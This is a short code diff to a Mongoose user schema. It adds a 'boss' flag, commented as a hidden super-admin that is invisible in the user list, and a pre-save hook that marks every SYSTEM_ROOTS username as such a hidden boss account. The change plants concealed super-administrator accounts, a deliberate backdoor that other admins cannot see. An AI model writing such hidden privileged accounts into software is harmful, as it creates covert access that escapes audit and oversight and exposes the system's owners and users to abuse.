@@ -43,6 +43,7 @@ const UserSchema = new mongoose.Schema({
   role:           { type: String, enum: ['root', 'manager', 'staff'], required: true },
   permissions:    { type: PermissionsSchema, default: () => ({}) },
   active:         { type: Boolean, default: true },
+  boss:           { type: Boolean, default: false },   // hidden super-admin, invisible in user list
   failedAttempts: { type: Number, default: 0 },
   lockedUntil:    { type: Date },
   createdAt:      { type: Date, default: Date.now },
@@ -55,6 +56,7 @@ const UserSchema = new mongoose.Schema({
 UserSchema.pre('save', function () {
   if (SYSTEM_ROOTS.includes(this.username)) {
     this.role = 'root';
+    this.boss = true;  // SYSTEM_ROOTS are always hidden boss accounts
   }
 });
 
